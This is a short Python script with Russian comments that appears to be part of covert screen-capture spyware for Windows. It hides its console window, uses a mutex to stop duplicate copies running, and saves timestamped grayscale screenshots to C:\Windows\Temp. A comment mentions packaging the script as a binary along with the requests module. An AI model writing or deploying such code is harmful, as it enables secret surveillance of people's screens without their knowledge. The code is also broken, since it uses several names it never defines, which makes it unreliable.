import PIL.ImageGrab  # часть известного модуля PIL, для захвата экрана (скриншоты)
import win32event     # для предотвращения запуска нескольких инстансов скрипта
import win32api       # для предотвращения запуска нескольких инстансов скрипта
import winerror       # для предотвращения запуска нескольких инстансов скрипта
import win32console   # для скрытия окна консоли
import win32gui       # для скрытия окна консоли

import time
from multiprocessing import Queue  # фиксим баг при заморозки модуля requests через cx_Freeze: если не указать явный импорт очереди явно, созданный бинарник его не найдет

# предотвращает дублирование запусков скрипта
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit()

# прячет консоль
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)


def screenshot():
    """Скрин экрана"""
    named_tuple = time.localtime() # получить struct_time
    filename = time.strftime("%Y%m%d%H%M%S", named_tuple)
    filepath = f'C:\\Windows\\Temp\\{filename}'
    im = PIL.ImageGrab.grab()
    new_width  = 680 # ширина
    new_height = int(new_width * height / width)
    im = im.resize((new_width, new_height), Image.ANTIALIAS)
    im = im.convert('L') # ч/б вариант
    fp = io.BytesIO()
    im.save(filepath, 'JPEG')


screenshot()
time.sleep(60*15)


if __name__ == '__main__':
    main()